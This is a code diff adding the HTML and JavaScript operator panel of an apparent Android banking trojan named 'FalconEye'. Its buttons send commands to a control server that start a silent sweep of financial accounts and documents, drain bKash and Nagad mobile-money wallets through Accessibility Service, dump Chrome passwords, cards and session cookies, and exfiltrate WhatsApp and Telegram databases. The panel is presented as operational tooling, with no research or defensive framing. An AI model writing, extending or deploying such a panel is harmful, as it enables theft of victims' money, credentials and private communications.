@@ -1,0 +1,86 @@
+<div class="ui segment">
+    <h2 class="ui header">
+        <i class="eye red icon"></i>
+        <div class="content">
+            FalconEye Special Operations
+            <div class="sub header">Advanced coordinated attack vectors and automation</div>
+        </div>
+    </h2>
+
+    <div class="ui warning message">
+        <i class="exclamation triangle icon"></i>
+        <b>Warning:</b> These operations are highly invasive and automated. Ensure accessibility services are enabled on the target device.
+    </div>
+
+    <div class="ui cards">
+        <div class="card">
+            <div class="content">
+                <div class="header">Coordinated Sweep</div>
+                <div class="meta">Automated Attack</div>
+                <div class="description">
+                    Triggers the 5-10 minute silent sweep of financial accounts, browser credentials, and local documents.
+                </div>
+            </div>
+            <div class="ui bottom attached red button" onclick="sendCommand('falcon_sweep')">
+                <i class="bolt icon"></i>
+                Start Full Sweep
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="content">
+                <div class="header">Financial Hijack</div>
+                <div class="meta">Mobile Money</div>
+                <div class="description">
+                    Targets bKash and Nagad apps using Accessibility Service to auto-fill and transfer funds.
+                </div>
+            </div>
+            <div class="ui bottom attached primary button" onclick="sendCommand('falcon_finance')">
+                <i class="money bill alternate icon"></i>
+                Drain Wallets
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="content">
+                <div class="header">Credential Harvest</div>
+                <div class="meta">Browser Data</div>
+                <div class="description">
+                    Extracts Chrome saved passwords, credit card details, and session cookies.
+                </div>
+            </div>
+            <div class="ui bottom attached blue button" onclick="sendCommand('falcon_creds')">
+                <i class="key icon"></i>
+                Dump Credentials
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="content">
+                <div class="header">Messenger Steal</div>
+                <div class="meta">WhatsApp / Telegram</div>
+                <div class="description">
+                    Exfiltrates local chat databases and WhatsApp backup files.
+                </div>
+            </div>
+            <div class="ui bottom attached green button" onclick="sendCommand('falcon_messenger')">
+                <i class="whatsapp icon"></i>
+                Exfiltrate DBs
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function sendCommand(cmd) {
+            $.post(baseURL + '/sendCommand', {
+                command: cmd
+            }, function(data) {
+                if (data.success) {
+                    showNotification('success', 'Command ' + cmd + ' sent successfully');
+                } else {
+                    showNotification('error', 'Failed to send command');
+                }
+            });
+        }
+    </script>
+</div>
